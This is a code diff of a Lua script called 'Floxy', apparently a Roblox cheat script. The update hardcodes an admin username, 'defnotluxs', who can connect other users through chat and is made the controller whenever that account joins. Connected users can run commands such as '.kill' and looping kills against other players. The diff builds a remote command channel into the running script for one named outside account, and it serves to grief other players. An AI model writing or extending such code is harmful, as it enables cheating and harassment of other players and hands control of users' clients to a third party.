@@ -1,10 +1,12 @@
 --[[  
-    Floxy Script - Fully Corrected & Stabilized by luxx (v64 - Connection Fixes)  
+    Floxy Script - Admin Control by luxx (v66 - Admin Lockdown)  
 
-    UPDATES (v64 - Connection Fixes):  
-    - FIXED: The `@ [username]` command logic has been completely overhauled to work correctly and reliably.  
-    - ADDED: Chat feedback messages are now sent to confirm when a user is successfully connected or disconnected.  
-    - ADDED: A notification is now sent when the Main Connector leaves, resetting the connection for all users.  
+    UPDATES (v66 - Admin Lockdown):  
+    - CRITICAL SECURITY: Implemented a hardcoded admin system.  
+    - The `ADMIN_USERNAME` variable is now set to "defnotluxs".  
+    - Only the player matching `ADMIN_USERNAME` can use the connect (`@`) and unconnect (`.unconnect`) commands.  
+    - All other users are prevented from managing connections, creating a secure control hierarchy.  
+    - The script now proactively assigns the admin as the `MainConnector` upon joining.  
 ]]  
 
 -- Services  
@@ -40,6 +42,7 @@ local AwaitingRejoinConfirmation = false
 local ChangeTimeEvent = nil  
 
 -- Configuration  
+local ADMIN_USERNAME = "defnotluxs" -- **<<< HARDCODED ADMIN USERNAME >>>**  
 local Dist = 0  
 local AuraEnabled = false  
 local AuraVisible = false  
@@ -77,9 +80,12 @@ local function sendWebhook(payload)
     end)  
 end  
 
-local function sendMessage(message)  
+local function sendMessage(message, channel)  
     pcall(function()  
-        TextChatService.ChatInputBarConfiguration.TargetTextChannel:SendAsync(message)  
+        local targetChannel = channel or TextChatService.ChatInputBarConfiguration.TargetTextChannel  
+        if targetChannel then  
+            targetChannel:SendAsync(message)  
+        end  
     end)  
 end  
 
@@ -434,31 +440,40 @@ local function onMessageReceived(messageData)
         end  
     end  
 
+    -- Connection Commands (ADMIN ONLY)  
     if command:sub(1,1) == "@" then  
-        local username = arg2 or command:sub(2)  
+        if authorPlayer.Name:lower() ~= ADMIN_USERNAME:lower() then return end -- Check if author is ADMIN  
         if not MainConnector then MainConnector = authorPlayer end  
+
+        local username = command:sub(2)  
+        if arg2 then username = arg2 end  
         
-        if authorPlayer == MainConnector then  
-            local targetPlayer = findPlayer(username)  
-            if targetPlayer and not table.find(ConnectedUsers, targetPlayer) then  
-                table.insert(ConnectedUsers, targetPlayer)  
-                table.insert(Whitelist, targetPlayer.Name)  
-                sendMessage("Connected with " .. targetPlayer.Name)  
-            end  
+        local targetPlayer = findPlayer(username)  
+        if targetPlayer and not table.find(ConnectedUsers, targetPlayer) then  
+            table.insert(ConnectedUsers, targetPlayer)  
+            table.insert(Whitelist, targetPlayer.Name)  
+            sendMessage(authorPlayer.Name .. " has connected you.", messageData.Channel)  
         end  
         return  
     end  
 
-    if authorPlayer ~= LP and not table.find(ConnectedUsers, authorPlayer) then return end  
-
-    if command == ".unconnect" and arg2 and authorPlayer == MainConnector then  
+    if command == ".unconnect" and arg2 then  
+        if authorPlayer.Name:lower() ~= ADMIN_USERNAME:lower() then return end -- Check if author is ADMIN  
+        
         local targetPlayer = findPlayer(arg2)  
         if targetPlayer and targetPlayer ~= MainConnector then  
             for i, user in ipairs(ConnectedUsers) do if user == targetPlayer then table.remove(ConnectedUsers, i); break end end  
             for i, name in ipairs(Whitelist) do if name == targetPlayer.Name then table.remove(Whitelist, i); break end end  
-            sendMessage("Unconnected: " .. targetPlayer.Name)  
+            sendMessage(authorPlayer.Name .. " has unconnected " .. targetPlayer.Name, messageData.Channel)  
         end  
-    elseif command == ".kill" and arg2 then killOnce(arg2)  
+        return  
+    end  
+
+    -- Check if user is authorized to use other commands  
+    if not table.find(ConnectedUsers, authorPlayer) then return end  
+
+    -- Other Commands  
+    if command == ".kill" and arg2 then killOnce(arg2)  
     elseif command == ".loop" and arg2 then  
         if arg2:lower() == "all" then  
             for _, player in ipairs(PlayerList) do  
@@ -658,13 +673,27 @@ task.spawn(function()
     end  
 end)  
 
-for _, player in ipairs(Players:GetPlayers()) do table.insert(PlayerList, player) end  
-table.insert(ConnectedUsers, LP); table.insert(Whitelist, LP.Name)  
+for _, player in ipairs(Players:GetPlayers()) do  
+    table.insert(PlayerList, player)  
+    if player.Name:lower() == ADMIN_USERNAME:lower() then  
+        MainConnector = player  
+        print("Floxy System: Admin '" .. player.Name .. "' found and set as Main Connector.")  
+    end  
+end  
+table.insert(ConnectedUsers, LP)  
+table.insert(Whitelist, LP.Name)  
 
 LP.CharacterAdded:Connect(onCharacterAdded)  
 if LP.Character then onCharacterAdded(LP.Character) end  
 
-Players.PlayerAdded:Connect(function(p) table.insert(PlayerList, p) end)  
+Players.PlayerAdded:Connect(function(p)  
+    table.insert(PlayerList, p)  
+    if p.Name:lower() == ADMIN_USERNAME:lower() then  
+        MainConnector = p  
+        sendMessage("Admin '"..p.Name.."' has joined.")  
+        print("Floxy System: Admin '" .. p.Name .. "' joined and set as Main Connector.")  
+    end  
+end)  
 Players.PlayerRemoving:Connect(function(p)  
     if spinTarget and spinTarget == p then stopSpinLoop() end  
     removeTarget(p.Name)  
@@ -672,7 +701,8 @@ Players.PlayerRemoving:Connect(function(p)
     for i, u in ipairs(ConnectedUsers) do if u == p then table.remove(ConnectedUsers, i); break end end  
     if FollowTarget and p == FollowTarget then stopSafeZoneLoop() end  
     if MainConnector == p then  
-        MainConnector = nil; table.clear(ConnectedUsers); table.clear(Whitelist)  
+        MainConnector = nil  
+        table.clear(ConnectedUsers); table.clear(Whitelist)  
         table.insert(ConnectedUsers, LP); table.insert(Whitelist, LP.Name)  
         sendMessage("Main Connector has left. Connection reset.")  
     end  
@@ -682,5 +712,5 @@ Players.PlayerRemoving:Connect(function(p)
 end)  
 TextChatService.MessageReceived:Connect(onMessageReceived)  
 
-sendMessage("Script Executed - Floxy (Fixed by luxx v64)")  
-print("Floxy System Loaded. User Authorized.")
+sendMessage("Script Executed - Floxy (Fixed by luxx v66)")  
+print("Floxy System Loaded. User Authorized. Admin is "..ADMIN_USERNAME)
